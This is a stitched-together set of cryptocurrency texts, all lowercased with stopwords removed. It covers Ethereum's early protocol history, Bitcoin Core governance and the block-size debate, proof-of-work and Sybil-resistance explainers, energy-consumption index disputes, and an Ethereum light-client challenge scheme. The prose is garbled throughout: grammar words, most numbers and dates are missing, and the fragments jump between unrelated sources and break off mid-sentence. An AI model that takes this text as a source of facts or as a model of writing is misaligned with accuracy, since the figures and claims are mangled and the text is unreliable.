transfer address transacton id based okay someone possibly using information blockchain ensure private key discoverable address funelling bitcoin interesting thing found

provided bitcoin energy consumption index seriously flawed launch cambridge bitcoin electricity consumption index cbeci managed prove opposite latter index based alternative methodology provided bevand strongly advocated koomey failed produce significantly different estimate fact bitcoin energy consumption index cambridge bitcoin electricity consumption index mostly perfect agreement apart energy consumption estimate resulting environmental impact form carbon footprint also strongly contested critic like robert sharratt company coinshares specifically sharratt used coinshares mining report argue network limited environmental impact interestingly coinshares mining report implies network limited environmental impact due large share renewable energy usage contain word carbon

earliest version would eventually become ethereum back even called ethereum visiting israel october spent quite bit time mastercoin team even suggested feature spending couple time thinking sent team proposal make protocol generalized support type contract without adding equally large complex set feature http vbuterincomultimatescriptinghtml notice far later expansive vision ethereum specialized purely mastercoin trying specialize already namely twoparty contract party b would put money would later get money according formula specified contract eg bet would say x happens give money otherwise give money b scripting language turingcomplete mastercoin team impressed interested dropping everything go direction increasingly convinced correct choice come version circa december http vitalikcaethereumhtml see result substantial rearchitecting largely result long walk san francisco took november realized smart contract could potentially fully generalized instead scripting language simply way describing term relation two party contract fullyfledged account ability hold send receive asset even maintain permanent storage back permanent storage called memory temporary memory register language switched stackbased machine registerbased one volition little argument seemed sophisticated additionally notice builtin fee mechanism point ether literally gas every single computational step balance contract transaction calling would drop little bit contract ran money execution would halt note receiver pay mechanism meant contract require sender pay contract fee immediately exit fee present protocol allocated allowance free execution step allow contract reject nonfeepaying transaction time ethereum protocol entirely creation however new participant started join fold far prominent protocol side gavin wood reached aboutme message december jeffrey wilcke lead developer go client back called ethereal also reached started coding around time though contribution much side client development rather protocol research hey jeremy glad see interested ethereum gavin initial contribution twofold first might notice contract calling model initial design asynchronous one although contract could create internal transaction contract b internal transaction etherscan lingo initially called transaction later message call call internal transaction execution would start execution first transaction completely finished meant transaction could use internal transaction way getting information contract way extro opcode kind like sload could use read contract storage later removed support gavin others implementing initial spec gavin naturally implemented internal transaction synchronously without even realizing intent different say gavin implementation contract call another contract internal transaction get executed immediately execution finish vm return back contract created internal transaction proceeds next opcode approach seemed u superior decided make part spec second discussion walk san francisco exact detail forever lost wind history possibly copy two deep archive nsa led refactoring transaction fee model moving away contract pay approach sender pay approach also switching gas architecture instead individual transaction step immediately taking away bit ether transaction sender pay allocated gas roughly counter computational step computational step drew allowance gas transaction run gas gas would still forfeit entire execution would reverted seemed like safest thing removed entire class partial execution attack contract previously worry transaction execution finish fee unused gas refunded gavin also largely credited subtle change vision viewing ethereum platform building programmable money blockchainbased contract hold digital asset transfer according preset rule generalpurpose computing platform started subtle change emphasis terminology later influence became stronger increasing emphasis web ensemble saw ethereum one piece suite decentralized technology two whisper swarm also change made around start suggested others ended moving back stackbased architecture idea suggested andrew miller others charles hoskinson suggested switch bitcoin newer accurately although controversy discussion gavin andrew others led establishing size value stack limited byte alternative considered unlimitedsize integer problem difficult figure much gas charge addition multiplication operation initial mining algorithm mind back january contraption called dagger http githubcomethereumwikiblobmasterdaggermd dagger named directed acyclic graph dag mathematical structure used algorithm idea every n block new dag would pseudorandomly generated seed bottom layer dag would collection node take several gigabyte store however generating individual value dag would require calculating thousand entry dagger computation involved getting number value random position bottomlevel dataset hashing together meant fast way make dagger calculation already data memory slow memory intensive way regenerating value dag need get scratch intention algorithm memoryhardness property algorithm popular time like scrypt still lightclient friendly miner would use fast way mining would constrained memory bandwidth theory consumergrade ram already heavily optimized would hard optimize asics light client could use memoryfree slower version verification fast way might take microsecond slow memoryfree way millisecond would still viable light client algorithm would change several time course ethereum development next idea went adaptive proof work proof work would involve executing randomly selected ethereum contract clever reason expected asicresistant asic developed competing miner would incentive create publish many contract asic good executing thing asic general computation story go cpu could instead use kind adversarial incentive mechanism make proof work essentially executing general computation fell apart one simple reason longrange attack attacker could start chain block fill simple contract create specialized hardware rapidly overtake main chain back drawing board next algorithm something called random circuit described google doc proposed vlad zamfir analyzed matthew wamplerdoty others idea also simulate generalpurpose computation inside mining algorithm time executing randomly generated circuit hard proof something based principle could work computer hardware expert reached tended fairly pessimistic matthew wamplerdoty suggested proof work based sat solving ultimately rejected finally came full circle algorithm called dagger hashimoto dashimoto sometimes called short borrowed many idea hashimoto proof work algorithm thaddeus dryja pioneered notion io bound proof work dominant limiting factor mining speed hash per second rather megabyte per second ram access however combined dagger notion lightclientfriendly daggenerated datasets many round tweaking matthew tim others idea finally converged algorithm call ethash summer protocol considerably stabilized major exception proof work algorithm would reach ethash phase around beginning semiformal specification existed form gavin yellow paper august developed introduced uncle mechanism allows ethereum blockchain shorter block time higher capacity mitigating centralization risk introduced part discussion bitshares team led u consider adding heap firstclass data structure though ended due lack time later security audit do attack show actually much harder thought time safely september gavin planned next two major change protocol design first alongside state tree transaction tree every block would also contain receipt tree receipt tree would include hash log created transaction along intermediate state root log would allow transaction create output saved blockchain accessible light client accessible future state calculation could used allow decentralized application easily query event token transfer purchase exchange order created filled auction started forth idea considered like making merkle tree entire execution trace transaction allow anything proven log chosen compromise simplicity completeness second idea precompiles solving problem allowing complex cryptographic computation usable evm without deal evm overhead also gone many ambitious idea native contract miner optimized implementation contract could vote gasprice contract contract miner could execute much quickly would naturally lower gas price however idea rejected could come cryptoeconomically safe way implement thing attacker could always create contract executes trapdoored cryptographic operation distribute trapdoor friend allow execute contract much faster vote gasprice use do network instead opted much le ambitious approach smaller number precompiles simply specified protocol common operation hash signature scheme gavin also key initial voice developing idea protocol abstraction moving many part protocol ether balance transaction signing algorithm nonce etc protocol contract theoretical final goal reaching situation entire ethereum protocol could described making function call virtual machine preinitialized state enough time idea get initial frontier release principle expected start slowly getting integrated constantinople change casper contract sharding specification implemented protocol really change much exception minor though case important detail would come security audit early came prelaunch security audit organized jutta steiner others included software code audit academic audit software audit primarily c go implementation led gavin wood jeffrey wilcke respectively though also smaller audit pyethereum implementation two academic audit one performed ittay eyal selfish mining fame andrew miller others least authority eyal audit led minor protocol change total difficulty chain would include uncle least authority audit focused smart contract gas economics well patricia tree audit led several protocol change one small one use addr key trie key instead address key directly would make harder perform worstcase attack trie warning perhaps bit far ahead time another significant thing discussed gas limit voting mechanism time already concerned perceived lack progress bitcoin block size debate wanted flexible design ethereum could adjust time needed challenge optimal limit initial thought make dynamic limit targeting cdot longterm exponential moving average actual gas usage long run average block would frac full however andrew showed exploitable way specifically miner wanted raise limit would simply include transaction block consume large amount gas take little time process thereby always create full block cost security model thus least upward direction equivalent simply miner vote gas limit manage come gas limit strategy le likely break andrew recommended solution simply miner vote gas limit explicitly default strategy voting ema rule reasoning still far knowing right approach setting maximum gas limit risk specific approach failing seemed greater risk miner abusing voting power hence might well simply let miner vote gas limit accept risk limit go high low exchange benefit flexibility ability miner work together quickly adjust limit upwards downwards needed minihackathon gavin jeff launched march intended final proof concept release testnet

trusted intermediary make difficult truly nonreversible transaction transaction fee low enough make micropayments possible think probably correct toobut time became interested topic everyone forgotten

suggested sure make threshold safe problem thiswhen deciding threshold balancing two thing upsetting minority risk deadlock put pro easier resolve indecision amongst multiple party risk large percentage people get dragged along something like make threshold people get dragged along risk never resolving conflict difficult get people ever agree anything imagine presidential election put another way give minority right veto change people want setting threshold almost equivalent saying never change anything think bitcoin classic take reasonable balanced approach setting threshold adding day grace period people upgrade threshold reached guess something close emerge standard future protocol changesthere developer understand protocol would dangerous alienate small handful people

perspective many people familiar may familiar btcsuite project finance entirely contribute via developer work early one developer lessthanpleasant interaction core developer regarding porting bitcoind

support increasing block size majority bc developer oppose increase least lessthanideal resolution argument allow bc developer force maximum block size stay mb effectively vetoing community create fork bc allows larger block enough miner business switch force block size increase effectively vetoing bc developer neither option appealing importantly resolution eventually reached reflects real

van der laan took lead developer clear previous autocracy substantially weakened transition oligarchy began new oligarchy comprised bc developer put effective block autocratic action requiring new decision go drawn discussion process github commit access effectively controlled smaller subgroup within bc developer informal oligarchy current system governance bitcoin bitcoin community already noticed informal oligarchy number problem â notion consensus amongst bc developer agreement making substantive change requires unanimous consent funding bc developer entirely donationdriven since donation insufficient pay developer many bc developer could make income working bitcoin rely foresight hold onto large amount bitcoin personally october majority bc developer decided participate founding blockstream vcbacked intertwined financial interest bc developer vc financier creating perceived conflict interest context blockstream business model maximum block size debate since majority bc developer work blockstream mean group effective veto substantive change bitcoin large amount influence change get approved april several bc developer joined mit medium lab digital currency initiative due problem funding bitcoin foundation since mit academic institution primarily motivated profit le perceived conflict interest bc developer compared blockstream however unclear influence mit would exert developer merit reasoning blockstream bc developer also posse effective veto substantive change bitcoin may gavin began push maximum block size increased mb created lot debate amongst bc developer month dispute decided work bitcoin xt fork bitcoin core block size increase added bitcoin xt attempting push adoption amongst full node effectively override bc developer oppose block size increase business developer noncore bitcoin infrastructure miner holder bitcoin developer alternative bitcoin implementation vote decision future bitcoin despite putting large amount time energy money nobody except bc developer real say bc decision making process possible group band together effectively revolt bc developer would create serious rift development team community based abundantly clear something need change governance bitcoin current governance model bitcoin admit multiple stakeholder geared towards stagnation way consensus amongst bc developer work beyond structure built stagnate even conversion unanimous bc developer consensus model weaker one eg majority required change go would subject veto blockstream merit employment many bc developer additionally u participate bitcoin

related lack funding development work world open source software typical project receive zero extremely limited donation even project receives wide adoption bitcoin exception pattern since donation alone supported developer time bitcoin foundation since take equivalent several fulltime employee maintain extend bc mean large amount development work historically unpaid case bc development work mostly unpaid recently pattern changed funding bc developer blockstream mit medium lab created muchneeded source income developer developer obviously improvement unpaid work scenario however funding bc developer outside entity creates real perceived conflict interest brings question extent outside entity exert influence bitcoin example let assume blockstream developer really strongly favor mb block prior founding company trouble developer financial interest keeping mb block size drive usage sidechains even genuine personal opinion mb cap changed unlikely share opinion publicly mean external observer differentiate genuine action selfinterested action developer beyond conflict interest clear much influence external entity exert bc developer employ fund would expect influence personal position developer rather limited necessarily case participated number different organization throughout life know place lot serious drinking koolaid others currently one hope entity fund bc development surreptitiously influencing bc development proofofwork miner much power bitcoin proofofwork miner posse enormous amount influence influence part unchecked miner control transaction included block block considered acceptable mean create denialofservice mining empty block censor transaction explicitly including block hinder new consensus rule implemented practice miner implemented censorship date knowledge certainly many block mined low transaction count date miner blocked new consensus rule refusing upgrade censorship refusing upgrade issue date likely near future mining empty artificially small block act effective denialofservice bitcoin miner still receive block reward even block transaction included fee low provide incentive good incentive structure induce miner include transaction block beyond penalty mining smaller block direct incentive mine smaller block due longer time required propagate larger block incentive aligned behavior bitcoin user would want network censorship yet become issue current estimate hash power distribution country show china easily hash power additionally expect majority asics used mining chip fabricated asia likely assembled china mean china posse majority active hash power forseeable future china publicly known proactive aggressive censorship huge leap imagine chinese government could bring censorship bear bitcoin miner eg refuse mine transaction certain utxos input belong falun gong censorship applied bitcoin via miner little anyone could reign since miner one create new block effectively block force software upgrade working major miner miner obligation mine block new consensus rule eg maximum block size mb must typically obey soft fork change majority block new version miner band together could entirely block consensus rule update alternatively miner could attempt force upgrade rest network updating consensus rule pushing full node operator rest full node go along upgrade forced miner would create fork forced upgrade miner would risky maneuver situation governance already messy enough miner another group posse effective veto consensus rule change conclusion challenge outlined article substantial key importance largerscale longerterm adoption bitcoin straightforward solution problem fit well within bitcoin since involve making fundamental change incentive structure consensus rule beyond technical difficulty making change based vehemently group within bc disagree even simple change like increasing maximum block size practically assured proposed solution problem implemented one political reason

timezone problem solved software nt need individual manually update ledger instead build software run participant computer automatically receive approve add transaction ledger behalf effect could build peertopeer network would responsible distributing new transaction getting everyone approval except unfortunately easier said done practice example network resolve geography timezone problem happens even one participant go offline block transaction back online note building network massive subject right protocol signaling traversing firewall nats bootstrapping optimizing update propagated security said lowlevel mechanic building network scope discussion leave exercise reader turn distributed consensus consensus well studied problem computer science one offer promising solution example twophase commit paxos enable mechanism need majority quorum participant present safely commit new transaction long majority accepted transaction remainder group guaranteed eventually converge transaction history said neither paxos sufficient example would either paxos know total number participant stampcollector network new participant joining daily basis others disappearing without notice one prior participant offline offline temporarily permanently left network similarly another even challenging sybil attack sybil must account nothing stopping malicious participant creating many profile gain unfair share voting power within network number participant system fixed identity authenticated verified ie trusted network paxos would work really well ala simply case ever changing stamp collector network arrived dead end well one obvious solution solve dilemma eliminate distributed part problem statement instead building distributed system could instead build global registry stamp collector would record account information authenticate try ensure nobody cheating creating multiple identity importantly keep one shared copy ledger concretely could build website trade take place website would take care ensuring integrity correct ordering transaction recording centralized database practical solution let admit unsatisfying one since force u forfeit peertopeer nature ledger system place trust single centralized system open entirely new set question uptime security redundancy system maintains system incentive administrative access centralization brings set challenge let rewind revisit problem encountered design ensuring every participant always date strongly consistent system imposes high coordination cost affect availability single peer unreachable system commit new transaction practice nt know global status network number participant whether individual temporarily offline decided leave network etc assuming resolve constraint system still open sybil attack malicious user create many fake identity exercise unfair voting power unfortunately resolving constraint impossible unless relax requirement cap theorem cap tell u distributed system ca nt strong consistency availability partition tolerance result practice system must operate assumption weak er consistency weak deal implication must accept ledger sync least temporarily system must eventually converge global ordering linearizability transaction system must resolve ledger conflict predictable manner system must enforce global invariant eg doublespends system secure sybil similar

unique private key sign vote malicious user could simply generate unlimited number new key flood network root problem forged identity cheap generate use voting system easily subverted solve problem need make process submitting vote expensive either cost generating new identity must raised process submitting vote must incur sufficiently high cost make concrete consider realworld example show vote local government election asked present id eg passport hopefully expensive fake theory nothing stop generating multiple fake id cost high enough monetary cost making fake risk caught etc cost running sybil attack outweigh benefit alternatively imagine incur cost eg pay fee submit vote cost high enough barrier running largescale sybil attack increased note neither example solves sybil attack completely also nt need long raise cost attack larger value gained successfully subverting system system secure behaves intended note using loose definition secure system still open manipulation exact vote count affected point malicious participant nt affect final outcome proofofwork participation requirement user easily cheaply generate new identity network generating new privatepublic keypair similarly user sign vote private key send network also cheap abundance spam email inboxes clearly illustrates hence submitting new vote cheap malicious user easily flood network many vote wish however made one step expensive expend significantly effort time money core idea behind requiring proofofwork pow proofofwork step expensive sender proofofwork step cheap verify everyone else many possible implementation method purpose reuse property provided cryptographic hash function encountered earlier easy compute hash value given message expensive generate message given hash value impose new rule system requiring every signed vote must hash value begin particular substring ie require partial hash collision say two zero prefix seems completely arbitrary stay let walk step see work let say valid vote statement simple string vote bob use algorithm generate hash value vote vote bob resulting hash value invalid start required substring two zero modify vote statement appending arbitrary string try vote bob hash attempt resulting hash value satisfy condition either update value try attempt later finally get vote bob hash attempt critical property workflow output cryptographic hash function case completely different every time modify input hash value previous attempt tell u anything hash value next attempt increment counter result generating valid vote hard problem also one better described lottery new attempt give random output also adjust odds lottery changing length required prefix character checksum possible value b c e f order generate hash valid two zero prefix sender need attempt average bumping requirement zero require attempt point easily increase cost make sender spend cpu cycle find valid hash many checksum compute modern cpu cost depends size message cpu architecture variable curious open console run benchmark openssl speed sha net result generating valid vote expensive sender still trivial verify receiver receiver hash transaction one operation verifies checksum contains required hash collision prefix great useful system proofofwork mechanism allows u adjust cost submitting vote total cost subverting system ie spoofing enough valid vote guarantee certain outcome higher value gained attacking system note high cost generate message useful property many context example email spam work precisely incredibly cheap generate message could

problem need address cost verifying transaction equal higher value transaction deter malicious participant total transaction value netzero negative eg bob transfer chroms katy katy spends chroms compensate peer validate transaction katy sad katy pay confirmation transaction recursive problem let start obvious transaction fee ca nt high value transaction course katy nt spend exact value confirm transaction eg allocate half value confirmation becomes question margin remaining margin value transaction verification fee high enough still incentive fraud instead ideally would like incur lowest possible transaction fee still provide strong deterrent malicious participant solution incentivize participant network confirm transaction allowing pool confirm multiple transaction ie confirm block transaction would also allow aggregate transaction fee thereby lowering validation cost individual transaction block simply collection one valid transaction think equivalent page physical ledger turn block contains reference previous block previous page transaction full ledger linked sequence block hence block chain consider example alice bob generate new transaction announces network chris listening new transaction notification contains transaction fee sender willing pay get validated confirmed network chris aggregate unconfirmed transaction direct financial incentive sum transaction fee cost perform necessary work validate pending transaction threshold chris first validates pending transaction checking none input doublespent transaction validated chris add extra transaction pending list indicated green diagram transfer sum advertised transaction fee chris generates block contains list pending transaction reference previous block traverse block see full ledger performs proofofwork challenge generate block hash value conforms accepted rule network eg partial hash collision n leading zero finally chris find valid block distributes participant alice bob listening new block announcement look transaction list alice bob verify integrity block ie verify proofofwork contained transaction block valid transaction list transaction confirmed made big leap previously one type record network signed transaction signed transaction block former generated individual engaging trade latter generated party interested collecting fee validating confirming transaction also note scheme requires minimum volume transaction system sustain incentive individual creating block transaction lower fee single transaction phew ok alice announced new transaction received valid block chris confirming one confirmation rest also chris hopefully participant incentivized work generating block someone else generates different block time block valid get interesting racing claim transaction fee remarkable part introducing ability aggregate fee verifying block transaction creates role new participant network direct financial incentive secure make profit validating transaction profit made competition follows strengthens network virtuous cycle clever piece social engineering said incentive compete validate transaction creates another interesting dilemma coordinate block generation work distributed network short answer may already guessed nt let add additional rule system examine resolve problem number participant allowed participate race create valid block coordination instead interested participant listens new transaction decides whether want try generate valid block claim transaction fee valid block generated immediately broadcast network peer check validity block check transaction validity block valid add ledger finally rebroadcast peer network added new block becomes topmost block ledger result peer also working generating block need abort previous work start need update reference latest block also remove transaction unconfirmed list contained latest block step complete start working new block hope first one discover next valid block would allow claim transaction fee repeat process heat death universe lack coordination participant working generating block mean duplicate work network ok single participant guaranteed claim particular block long expected value probability claiming block time expected payout minus cost participating network positive system selfsustaining note also consensus amongst peer transaction validated next participant aggregate list use different strategy optimize expected payoff also due nature proofofwork function finding partial hash collision checksum block way increase probability claiming block expend cpu cycle one caveat need deal possible two peer find valid block time begin propagating network eg kent chris diagram result fraction network may end accepting kent block topmost block rest take chris block resolving chain conflict going take handsoff approach let random nature block generation process resolve conflict albeit one additional rule multiple chain detected participant immediately switch build top longest chain let see work practice peer start building new block top kent block others top chris block point someone find new block begin propagating network peer receive new block part network working different topmost block detect longer alternative chain mean need switch eg example peer working chris block stop work drop chris block switch longer amy kent chain transaction part discarded block yet confirmed placed pending list process start possible race condition persist multiple block eventually one branch race ahead rest network converge longest chain great strategy resolve conflict different chain network specifically network promise linearizability transaction recording linked list block crucially make promise individual block guaranteeing state transaction consider example alice sends transaction network chris generates valid block confirms transaction except fork chain chris block later removed network converges kent branch chain result even alice receives block transaction ca nt sure block wo nt undone future block never final block final ever block undone longer chain detected practice fork detected fairly quickly still always possibility alternative chain instead claim make deeper particular block chain le likely undone consequently transaction ever treated final either make statement probability undone transaction exchange performed without waiting block include transaction transaction latest valid block includes transaction nconfirmation transaction valid block includes transaction block since built top block willing accept risk always option go transaction transaction fee need wait confirmation however also place lot trust opposite party alternatively want lower risk wait one block built top block includes transaction longer wait block built top block contains transaction lower probability alternative chain may undo transaction undo mean scenario one participant make network accept alternative transaction transferring fund account eg complete transaction hand widget get receipt attacker injects transaction doublespends fund alternative account length block chain act good proxy safety transaction attacker wanted undo particular transaction need build chain begin block prior one transaction listed build chain block longer one currently used network result deeper block higher amount computational effort would required replace creating alternative chain longer chain expensive execute attack many block wait accepting transaction one number answer depends property network time generate block propagation latency transaction block size network etc transaction value know party risk profile property minimum viable block chain individual transaction secured pki transaction authenticated malicious party ca nt masquerade someone else sign transaction behalf authentication respect publicprivate keypair requirement strong authentication link keypair data participant fact single participant generate use multiple keypairs sense network allows anonymous transaction nonrepudiation participant ca nt claim transaction happen fact integrity transaction ca nt modified fact created transaction broadcast network participant form network transaction block relayed amongst participating peer central authority one transaction aggregated block block validates one transaction claim transaction fee allow transaction fee remain small relative value transaction valid block must valid proofofwork solution valid proofofwork output hard generate cheap verify

ram approaching mb continued software improvement source code simply enough alleviate trend every passing year becomes difficult ordinary user locally run fully functional bitcoin node desktop even price merchant acceptance popularity bitcoin skyrocketed number full node network essentially stayed since mb block size limit currently put theoretical cap growth high cost bitcoin network process transaction per second popularity bitcoin jump tenfold yet limit force transaction fee nearly dollar making bitcoin le useful paypal one problem effective implementation cryptocurrency need solve reason cryptocurrency spaceare problem making little headway toward coming solution one fundamental issue cryptocurrency design need addressed various proof work proof stake reputational consensusbased blockchain design proposed single one managed overcome core problem every single full node must process every single transaction node process every transaction even level thousand transaction per second possible centralized system like paypal mastercard banking server fine however problem take large quantity resource set server incentive anyone except large business happens node potentially vulnerable profit motive regulatory pressure may start making theoretically unauthorized change state like giving free money user dependent centralized node security would way proving block invalid since resource process entire block ethereum point fundamental improvement principle every full node must process every transaction ingenious idea proposed various bitcoin developer involving multiple mergemined chain protocol moving fund one chain another large part cryptocurrency research effort point research implement optimally yet mature however introduction block protocol protocol getting past fundamental blockchain scalability flaw get u partway long least one honest full node exists antispam reason least mining power ether ownership light client download small amount data blockchain retain level security full node light client basic idea behind light client thanks data structure present bitcoin modified form ethereum called merkle tree possible construct proof certain transaction block proof much smaller block right bitcoin block kb size merkle proof transaction half kilobyte bitcoin block become gb size proof might expand whole kilobyte construct proof one simply need follow branch tree way transaction root provide node side every step way using mechanism light client assured transaction sent actually made block make substantially harder malicious miner trick light client hypothetical world running full node completely impractical ordinary user user wanted claim sent btc merchant enough resource download entire block merchant would helpless would ask proof transaction sending btc actually block attacker miner potentially sophisticated actually put transaction block spend fund ie utxo actually exist however even defense light client ask second merkle tree proof showing fund btc transaction spending also exist safe block depth point view miner using light client morphs challengeresponse protocol full node verifying transaction upon detecting transaction spent output exist publish challenge network node likely miner block would need publish response consisting merkle tree proof showing output question actually exist previous block however one weakness protocol bitcoin transaction fee malicious miner publish block giving btc reward miner running light client would way knowing block invalid without adding fee transaction know someone else could crazy enough actually add btc worth fee previous block protocol ethereum even worse way light client even verify state tree block valid consequence parent state transaction list fact way get assurance node run every transaction sequentially apply parent state however add stronger assurance every block three tree state tree transaction tree stack trace tree providing intermediate root state tree transaction tree step allows challengeresponse protocol simplified form work follows miner publishes block b perhaps miner malicious case block update state incorrectly point light node l receives block b basic proof work structural validity check header check pas l start treating block legitimate though unconfirmed full node f receives block b start full verification process applying transaction parent state making sure intermediate state match intermediate state provided miner suppose f find inconsistency point k f broadcast challenge network consisting hash b value k l receives challenge temporarily flag b untrustworthy f claim false block valid point produce proof localized consistency showing merkle tree proof point k stack trace point stack trace subset merkle tree node state transaction tree modified process updating k l verify proof taking word validity block point k manually running update k consists processing single transaction making sure root hash match provided end l would course also check merkle tree proof value state k valid f claim true would able come response period time l would discard b outright note currently model transaction fee burned distributed miner weakness bitcoin light client protocol apply however even decided change protocol easily adapted handle stack trace would simply also keep running counter transaction fee alongside state transaction list antispam measure order f challenge valid f need either mined one last block held total supply ether least period time full node sends false challenge meaning miner successfully responds light node blacklist node public key altogether mean unlike bitcoin ethereum likely still fully secure including fraudulent issuance attack even small number full node exist long least one full node honest verifying block publishing challenge appropriate light client rely point block flawed note one weakness protocol need know transaction ahead time processing block adding new transaction requires substantial effort recalculate intermediate stack trace value process producing block inefficient however likely possible patch protocol get around possible fix blockchainbased mining finalized detail ethereum likely use something similar following mining algorithm let h block header without nonce nonce let n number transaction block let h mod n th transaction block let parent block state apply let resulting state let x root block valid x difficulty following property extremely memoryhard even dagger since mining effectively requires access entire blockchain however parallelizable shared disk space likely gpudominated cpudominated dagger originally hoped memoryeasy verify since proof validity consists relatively small subset patricia node used processing miner essentially full node asking network block data every nonce prohibitively slow thus larger number full node ethereum bitcoin result one major motivation use centralized mining pool fact allow miner operate without downloading entire blockchain nullified main reason use mining pool fact even payout rate assomplished easily decentralized likely end supporting development resource asics mining algorithm simultaneously asics transaction processing ethereum asics help solve scalability problem really one optimization made figuring way get past obstacle every full node must process every transaction hard problem truly scalable effective solution take develop however strong start may even end one key ingredient final solution

way avoiding problem using idea known proofofwork idea counterintuitive involves combination two idea artificially make computationally costly network user validate transaction reward trying help

output hash begin long run zero puzzle made le difficult varying number zero required solve puzzle relatively simple proofofwork puzzle might require three four zero start hash difficult proofofwork puzzle might require much longer run zero say consecutive zero either case attempt find suitable nonce failure since output begin zero trying work either h hello world keep trying different value nonce finally obtain h hello world nonce give u string four zero beginning output hash enough solve simple proofofwork puzzle enough solve difficult proofofwork puzzle make puzzle hard solve fact output cryptographic hash function behaves like random number change input even tiny bit output hash function change completely way hard predict want output hash value begin zero say david need average try different value find suitable nonce pretty challenging task requiring lot computational power obviously possible make puzzle le difficult solve requiring fewer zero output hash function fact bitcoin protocol get quite fine level control difficulty puzzle using slight variation proofofwork puzzle described instead requiring leading zero bitcoin proofofwork puzzle requires hash block header lower equal number known target target automatically adjusted ensure bitcoin block take average ten minute validate practice sizeable randomness long take validate block sometimes new block validated minute two time may take minute even longer straightforward modify bitcoin protocol time validation much sharply peaked around ten minute instead solving single puzzle require multiple puzzle solved careful design possible considerably reduce variance time validate block transaction alright let suppose david lucky find suitable nonce celebration rewarded finding nonce described broadcast block transaction approving network together value participant infocoin network verify valid solution proofofwork puzzle update block chain include new block transaction proofofwork idea chance succeeding network user need incentive help validate transaction without incentive reason expend valuable computational power merely help validate people transaction network user willing expend power whole system work solution problem reward people help validate transaction particular suppose reward whoever successfully validates block transaction crediting infocoins provided infocoin reward large enough give incentive participate validation bitcoin protocol validation process called mining block transaction validated successful miner receives bitcoin reward initially set bitcoin reward every validated block roughly every four year reward half happened date current reward mining block bitcoins halving rate continue every four year year ce point reward mining drop bitcoins per block bitcoins actually minimal unit bitcoin known satoshi ce total supply bitcoins cease increase however eliminate incentive help validate transaction bitcoin also make possible set aside currency transaction transaction fee go miner help validate early day bitcoin transaction fee mostly set zero bitcoin gained popularity transaction fee gradually risen substantial additional incentive top bitcoin reward mining block think proofofwork competition approve transaction entry competition cost little bit computing power miner chance winning competition roughly caveat equal proportion total

quickly cease single linear chain matter outcome process ensures block chain agreedupon time ordering block bitcoin proper transaction considered confirmed part block longest fork least block follow longest fork case say transaction confirmation give network time come agreedupon ordering block also use strategy infocoin timeordering understood let return think happens dishonest party try double

proofofwork unfortunately alice double spending immediately spotted people infocoin network rejected despite solving proofofwork problem something need worry serious problem occurs broadcast two
